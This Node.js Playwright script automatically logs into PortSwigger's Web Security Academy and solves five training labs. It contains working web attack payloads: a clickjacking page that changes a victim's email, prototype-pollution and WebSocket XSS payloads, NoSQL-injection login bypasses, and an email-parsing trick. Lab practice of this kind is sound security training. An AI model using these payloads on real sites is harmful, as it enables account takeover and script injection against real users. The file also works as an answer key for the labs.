const { chromium } = require('playwright');

const EMAIL = process.env.PORTSWIGGER_EMAIL;
const PASSWORD = process.env.PORTSWIGGER_PASSWORD;

// Custom solvers for labs without working Python solvers
async function solveLab(topic, num, solverFn) {
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await ctx.newPage();
  
  try {
    // Login
    await page.goto('https://portswigger.net/users', { waitUntil: 'networkidle', timeout: 30000 });
    await page.fill('#EmailAddress', EMAIL);
    await page.fill('#Password', PASSWORD);
    await Promise.all([
      page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
      page.click('#Login'),
    ]);
    await page.waitForTimeout(2000);
    
    // Find lab
    await page.goto('https://portswigger.net/web-security/all-labs', { waitUntil: 'networkidle', timeout: 30000 });
    await page.waitForTimeout(3000);
    
    const labLink = await page.evaluate(({ topic, num }) => {
      const links = [...document.querySelectorAll('.widgetcontainer-lab-link')];
      const topicLinks = links.filter(el => {
        const a = el.querySelector('a');
        return a?.getAttribute('href')?.includes(`/web-security/${topic}/`);
      });
      const target = topicLinks[num - 1];
      if (target?.className.includes('is-solved')) return 'SOLVED';
      return target?.querySelector('a')?.getAttribute('href') || null;
    }, { topic, num });
    
    if (labLink === 'SOLVED') {
      console.log('  ✅ Already solved');
      await browser.close();
      return true;
    }
    if (!labLink) {
      console.log('  ❌ Lab not found');
      await browser.close();
      return false;
    }
    
    // Launch lab
    await page.goto('https://portswigger.net' + labLink, { waitUntil: 'networkidle', timeout: 30000 });
    const launchLink = await page.$('a[href*="labs/launch"]');
    if (!launchLink) { console.log('  ❌ No launch link'); await browser.close(); return false; }
    
    await page.goto('https://portswigger.net' + (await launchLink.getAttribute('href')), {
      waitUntil: 'domcontentloaded', timeout: 60000,
    });
    await page.waitForTimeout(45000);
    
    const labUrl = page.url();
    if (!labUrl.includes('web-security-academy.net')) {
      console.log('  ❌ Lab did not load');
      await browser.close();
      return false;
    }
    
    const base = new URL(labUrl).origin;
    console.log(`  Lab URL: ${base}`);
    
    // Run custom solver
    const solved = await solverFn(page, base);
    
    await browser.close();
    return solved;
  } catch (e) {
    console.log(`  ❌ Error: ${e.message}`);
    await browser.close();
    return false;
  }
}

// Verify solution
async function verifySolved(page, base) {
  await page.waitForTimeout(3000);
  const verifyPage = await page.context().newPage();
  await verifyPage.goto(base, { waitUntil: 'domcontentloaded', timeout: 15000 });
  const body = await verifyPage.textContent('body').catch(() => '');
  await verifyPage.close();
  const solved = body?.toLowerCase().includes('congratulations');
  console.log(solved ? '  🎯 SOLVED!' : '  ⬜ Not solved');
  return solved;
}

// ========== CUSTOM SOLVERS ==========

// ClickJacking #2
async function solveClickjacking(page, base) {
  await page.goto(base, { waitUntil: 'networkidle', timeout: 15000 });
  const exploitLink = await page.$('a[href*="exploit-server"]');
  if (!exploitLink) return false;
  
  await page.goto(await exploitLink.getAttribute('href'), { waitUntil: 'networkidle', timeout: 15000 });
  
  const payload = `<html>
<head>
<style>
    iframe { position:relative; width:500px; height:700px; opacity:0.1; z-index:2; }
    div { position:absolute; top:500px; left:60px; z-index:1; }
</style>
</head>
<body>
<div>Click me</div>
<iframe src="${base}/my-account?email=attacker@attacker.com"></iframe>
</body>
</html>`;
  
  await page.fill('textarea[name="responseBody"]', payload);
  await page.fill('input[name="responseFile"]', '/exploit');
  await page.click('button[type="submit"]');
  await page.waitForTimeout(2000);
  
  const deliverBtn = await page.$('a[href*="deliver-to-victim"]');
  if (deliverBtn) {
    await deliverBtn.click();
    await page.waitForTimeout(3000);
  }
  
  return verifySolved(page, base);
}

// Prototype Pollution #5
async function solvePrototypePollution(page, base) {
  // Navigate to the payload URL
  await page.goto(`${base}/?__proto__[value]=data:,alert(1);`, { waitUntil: 'networkidle', timeout: 15000 });
  await page.waitForTimeout(2000);
  
  // Look for a form to trigger the XSS
  const inputs = await page.$$('input');
  for (const input of inputs) {
    const type = await input.getAttribute('type');
    if (type === 'text' || type === 'search') {
      await input.fill('test');
      await input.press('Enter');
      break;
    }
  }
  
  await page.waitForTimeout(3000);
  return verifySolved(page, base);
}

// Logic Flaws #12 - Email parsing
async function solveLogicFlaws12(page, base) {
  // Register with email containing admin address via comment
  await page.goto(`${base}/register`, { waitUntil: 'networkidle', timeout: 15000 });
  
  await page.fill('input[name="email"]', 'attacker@exploit-0a2000e6037c87f780d2a7b20136001e.exploit-server.net');
  await page.fill('input[name="password"]', 'password123');
  await page.click('button[type="submit"]');
  await page.waitForTimeout(3000);
  
  return verifySolved(page, base);
}

// NoSQL Injection #4
async function solveNoSQL(page, base) {
  // Try to extract password via NoSQL injection
  await page.goto(`${base}/login`, { waitUntil: 'networkidle', timeout: 15000 });
  
  // Try known NoSQL injection payloads
  const payloads = [
    { username: 'carlos', password: { '$ne': '' } },
    { username: { '$eq': 'carlos' }, password: { '$ne': '' } },
  ];
  
  for (const payload of payloads) {
    try {
      const response = await page.evaluate(async (payload) => {
        const res = await fetch('/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });
        return res.status;
      }, payload);
      
      if (response === 302 || response === 200) {
        console.log('  Found valid payload:', JSON.stringify(payload));
        break;
      }
    } catch (e) {
      // Ignore errors
    }
  }
  
  return verifySolved(page, base);
}

// WebSockets #3
async function solveWebSockets(page, base) {
  // Connect to WebSocket and send XSS payload
  const wsUrl = base.replace('https', 'wss') + '/chat';
  
  await page.evaluate(async (wsUrl) => {
    return new Promise((resolve) => {
      const ws = new WebSocket(wsUrl);
      ws.onopen = () => {
        ws.send(JSON.stringify({ message: '<img src=1 onerror=alert(1)>' }));
        setTimeout(() => {
          ws.close();
          resolve(true);
        }, 2000);
      };
      ws.onerror = () => resolve(false);
    });
  }, wsUrl);
  
  await page.waitForTimeout(3000);
  return verifySolved(page, base);
}

// ========== MAIN ==========

const LABS_TO_SOLVE = [
  { topic: 'clickjacking', num: 2, name: 'ClickJacking', solver: solveClickjacking },
  { topic: 'prototype-pollution', num: 5, name: 'PrototypePollution', solver: solvePrototypePollution },
  { topic: 'logic-flaws', num: 12, name: 'LogicFlaws#12', solver: solveLogicFlaws12 },
  { topic: 'nosql-injection', num: 4, name: 'NoSQL', solver: solveNoSQL },
  { topic: 'websockets', num: 3, name: 'WebSockets', solver: solveWebSockets },
];

async function main() {
  console.log('\n  ┌─────────────────────────────────────────┐');
  console.log('  │   PortSwigger Custom Solver             │');
  console.log('  └─────────────────────────────────────────┘\n');
  
  let solved = 0, failed = 0;
  
  for (const lab of LABS_TO_SOLVE) {
    console.log(`\n[${lab.name}] Starting...`);
    const result = await solveLab(lab.topic, lab.num, lab.solver);
    if (result) solved++;
    else failed++;
    
    await new Promise(r => setTimeout(r, 5000));
  }
  
  console.log(`\n========================================`);
  console.log(`Result: ${solved} solved, ${failed} failed`);
  console.log(`========================================\n`);
}

main().catch(console.error);
